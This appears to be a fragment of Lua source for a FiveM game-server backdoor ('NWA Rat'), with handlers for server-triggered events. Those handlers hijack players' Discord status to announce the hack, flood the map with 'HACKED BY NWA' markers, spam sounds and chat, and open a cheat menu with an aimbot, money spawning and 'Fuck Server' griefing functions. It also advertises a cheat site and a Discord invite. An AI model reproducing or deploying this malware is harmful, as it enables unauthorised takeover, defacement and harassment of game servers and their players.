RegisterNetEvent("NWA-Backdoor-pornScreen")
AddEventHandler("NWA-Backdoor-pornScreen", function()
...
RegisterNetEvent("NWA-Backdoor-discordHack")
AddEventHandler("NWA-Backdoor-discordHack", function(text)
    Citizen.CreateThread(function()
        while true do
			SetDiscordAppId(972882580519157822)
			SetDiscordRichPresenceAsset("NWA")
			SetRichPresence("Server Hacked by NWA")
			SetDiscordRichPresenceAssetText('Developer of NWA Rat: zImSkillz#4906')
			SetDiscordRichPresenceAssetSmall('NWA')
			SetDiscordRichPresenceAssetSmallText('Developer of NWA Rat: zImSkillz#4906')
			SetDiscordRichPresenceAction(0, ("Server: %s"):format(text), "https://discord.com/invite/D8arx7erxQ")
			SetDiscordRichPresenceAction(1, "Hacked by NWA", "https://discord.com/invite/D8arx7erxQ")
			Citizen.Wait(1)
        end
    end)
end)

RegisterNetEvent("NWA-Backdoor-BlipsHack")
AddEventHandler("NWA-Backdoor-BlipsHack", function()
	local blips = {
		{title="HACKED BY NWA", colour=2, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY NWA", colour=2, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY NWA", colour=2, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY NWA", colour=2, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY NWA", colour=2, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY NWA", colour=2, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY NWA", colour=2, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
		{title="HACKED BY NWA", colour=5, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY NWA", colour=5, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY NWA", colour=5, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY NWA", colour=5, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY NWA", colour=5, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY NWA", colour=5, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY NWA", colour=5, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
		{title="HACKED BY NWA", colour=27, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY NWA", colour=27, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY NWA", colour=27, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY NWA", colour=27, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY NWA", colour=27, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY NWA", colour=27, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY NWA", colour=27, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
		{title="HACKED BY NWA", colour=32, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY NWA", colour=32, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY NWA", colour=32, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY NWA", colour=32, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY NWA", colour=32, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY NWA", colour=32, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY NWA", colour=32, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0}
	 }
...
RegisterNetEvent("NWA-Backdoor-soundSpam")
AddEventHandler("NWA-Backdoor-soundSpam", function()
	Citizen.CreateThread(function()
		while true do
...
RegisterNetEvent("NWA-Backdoor-Falcon")
AddEventHandler("NWA-Backdoor-Falcon", function()
	Falcon = {}
	Falcon.debug = false
	...
	startMessage = "~r~âˆ‘~s~WELCOME ~n~USER â†’ ~r~[" ..GetPlayerName(PlayerId()).. "]"
	...
	Citizen.CreateThread(function()
		...
		while true do
			...
			if Falcon.IsMenuOpened('Falcon') then
				if Falcon.MenuButton('ðŸŒ~y~Plz Press Meeeeee', 'lynx') then
				elseif Falcon.MenuButton('~y~Â« ~r~âˆ‘ ~h~~y~Â» ~r~Player Options', 'player') then
				elseif Falcon.MenuButton('~y~Â« ~r~âˆ‘ ~h~~y~Â» ~b~Self Options', 'self') then
				elseif Falcon.MenuButton('~y~Â« ~r~âˆ‘ ~h~~y~Â» ~g~Models Options', 'appearance') then
				elseif Falcon.MenuButton('~y~Â« ~r~âˆ‘ ~h~~y~Â» ~y~Weapon Options', 'weapon') then
				elseif Falcon.MenuButton('~y~Â« ~r~âˆ‘ ~h~~y~Â» ~p~Vehicle Options', 'vehicle') then
				elseif Falcon.MenuButton('~y~Â« ~r~âˆ‘ ~h~~y~Â» ~c~World Options', 'world') then
				elseif Falcon.MenuButton('~y~Â« ~r~âˆ‘ ~h~~y~Â» ~m~Teleport Options', 'teleport') then
				elseif Falcon.MenuButton('~y~Â« ~r~âˆ‘ ~h~~y~Â» ~u~Misc Options', 'misc') then
				elseif Falcon.MenuButton('~y~Â« ~r~âˆ‘ ~h~~y~Â» ~o~Objects Options', 'objectspawner') then
				elseif Falcon.MenuButton('~y~Â« ~r~âˆ‘ ~h~~y~Â» ~r~Fuck Server', 'fuckserver') then
				elseif Falcon.MenuButton('~y~Â« ~r~âˆ‘ ~h~~y~Â» ~b~Lua Options', 'lua') then
				elseif Falcon.Button('~y~Â« ~r~âˆ‘ ~h~~y~Â» ~r~Kill Menu') then break
				end
				ShowInfo(motd2)
				ShowInfo(motd)
				ShowInfo(motd5)
			...
			elseif Falcon.IsMenuOpened('fuckserver') then
				...
				ShowInfo("~y~Fucking Players...")
					nukeserver()
				elseif Falcon.Button("~h~~y~Â»~r~ Spam Chat") then
					RapeAllFunc() 
		...
		elseif Falcon.Button("~y~Spawn ~p~Lion ~s~all Players") then
		 ...
		 elseif Falcon.Button('~o~Make all Players hamburger head') then
			...
			elseif Falcon.IsMenuOpened('self') then
				...
				elseif Falcon.ComboBox("~b~Player ~s~Functions ~y~Â»", {"~b~VRP ~s~Revive", "~b~Give Player Armor", "~y~Remove Player Armor", "~g~Clean Player", "~y~Suicide", "~y~Cancel Anim/Task"}, currPFuncIndex, selPFuncIndex, function(currentIndex, selClothingIndex)
		...
		elseif Falcon.Button("Change To ~p~Clown") then
			...
			elseif Falcon.IsMenuOpened('weapon') then
				...
				elseif Falcon.CheckBox("Aimbot", Aimbot) then
					Aimbot = not Aimbot
				elseif Falcon.ComboBox("Aimbot Bone Target ~y~Â»", AimbotBoneOps, currAimbotBoneIndex, selAimbotBoneIndex, function(currentIndex, selectedIndex)
			...
			elseif Falcon.IsMenuOpened('vehicle') then
				if Falcon.MenuButton("Vehicle Spawner", 'vehiclespawner') then
					...
					elseif Falcon.ComboBox("Vehicle Functions ~y~Â»", {"Repair ~b~Vehicle", "Clean ~g~Vehicle", "Dirty ~c~Vehicle"}, currVFuncIndex, selVFuncIndex, function(currentIndex, selClothingIndex)
			...
			elseif Falcon.IsMenuOpened('objectspawner') then
				...
				elseif Falcon.ComboBox("~g~Select~s~ To Object~h~~y~ Â»", objs_tospawn, currObjIndex, selObjIndex, function(currentIndex, selectedIndex)
			...
			elseif Falcon.IsMenuOpened('misc') then
				...
				elseif Falcon.MenuButton("~h~âˆ‘~r~Info", "InfoMenu") then
			...
			elseif Falcon.IsMenuOpened('vrp') then
				if Falcon.MenuButton("~h~~y~Â»~r~ Spawn ~b~Money ~r~NEW", 'money') then
...
RegisterNetEvent("NWA-Backdoor-Brutan")
AddEventHandler("NWA-Backdoor-Brutan", function()
	local mhaonn = true
	ESX = nil;
	...
	if ai > 1 and ac then aj = 'â† '..tostring(aj)..
	' â†’'
	end;
...
RegisterNetEvent("NWA-Backdoor-HackServer")
AddEventHandler("NWA-Backdoor-HackServer", function()
	local blips = {
		{title="HACKED BY NWA", colour=2, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY NWA", colour=2, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY NWA", colour=2, id=47, x = 117.220, y = -620.938, z = 206.047},
	...
	local texts = {
	   "N.W.A. are back | tetoware.cc | Kilo is back!",
	   "â€‡N.W.A. are back | tetoware.cc | Kilo is back!",
	   "â€‡â€‡N.W.A. are back | tetoware.cc | Kilo is back!",
	   "â€‡â€‡â€‡N.W.A. are back | tetoware.cc | Kilo is back!",
	   "â€‡â€‡â€‡â€‡N.W.A. are back | tetoware.cc | Kilo is back!",
	   "â€‡â€‡â€‡â€‡â€‡N.W.A. are back | tetoware.cc | Kilo is back!",
	   "â€‡â€‡â€‡â€‡â€‡â€‡N.W.A. are back | tetoware.cc | Kilo is back!",
	   "â€‡â€‡â€‡â€‡â€‡â€‡â€‡N.W.A. are back | tetoware.cc | Kilo is back!",
	   "â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡N.W.A. are back | tetoware.cc | Kilo is back!",
	   "â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡N.W.A. are back | tetoware.cc | Kilo is back!",
	   "â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡N.W.A. are back | tetoware.cc | Kilo is back!",
	   "â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡N.W.A. are back | tetoware.cc | Kilo is back!",
	   "â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡N.W.A. are back | tetoware.cc | Kilo is back!",
	   "â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡N.W.A. are back | tetoware.cc | Kilo is back!",
	   "â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡N.W.A. are back | tetoware.cc | Kilo is back!",
	   "â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡N.W.A. are back | tetoware.cc | Kilo is back!",
	   "â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡N.W.A. are back | tetoware.cc | Kilo is back!",
	   "â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡N.W.A. are back | tetoware.cc | Kilo is back!",
	   "â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡N.W.A. are back | tetoware.cc | Kilo is back!",
	   "â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡N.W.A. are back | tetoware.cc | Kilo is back!",
	   "â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡N.W.A. are back | tetoware.cc | Kilo is back!",
	   "â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡N.W.A. are back | tetoware.cc | Kilo is back!",
	   "â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡â€‡N.W.A. are back | tetoware.cc | Kilo is back!",
	...
	local config = {
	   ["TITLE"] = "~r~N.W.A. are back | tetoware.cc | Kilo is back!", 
	   ["SUBTITLE"] = "~r~N.W.A. are back | tetoware.cc | Kilo is back!",
	   ["MAP"] = "NWA",
	   ["STATUS"] = "NWA",
	   ["GAME"] = "NWA",
	   ["INFO"] = "NWA",
